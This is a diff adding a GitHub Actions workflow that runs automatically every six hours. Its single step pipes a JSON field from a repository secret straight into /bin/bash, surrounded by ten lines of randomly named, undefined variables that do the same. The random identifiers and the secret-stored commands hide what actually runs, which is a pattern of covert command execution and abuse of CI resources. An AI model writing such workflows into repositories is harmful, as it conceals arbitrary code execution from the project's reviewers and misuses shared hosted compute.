@@ -1,0 +1,28 @@
+name: yinzhiping2389
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yinzhiping2389
+        env:
+          eksrg38315: ${{ secrets.eksrg38315 }}
+        run: |
+          echo $eksrg38315 | jq -r .ybp80 | /bin/bash
+          echo $jlsb65 | jq -r .uvgm13 | /bin/bash
+          echo $vjt6941 | jq -r .vhabn0 | /bin/bash
+          echo $xl50 | jq -r .dz910 | /bin/bash
+          echo $mlo53077 | jq -r .shz9626 | /bin/bash
+          echo $pdef8 | jq -r .t355 | /bin/bash
+          echo $k55 | jq -r .oncxa86 | /bin/bash
+          echo $kzwyt05902 | jq -r .uh3783 | /bin/bash
+          echo $pv5 | jq -r .p64 | /bin/bash
+          echo $bw6 | jq -r .aftj7188 | /bin/bash
+          echo $apy4711 | jq -r .gee728 | /bin/bash
+
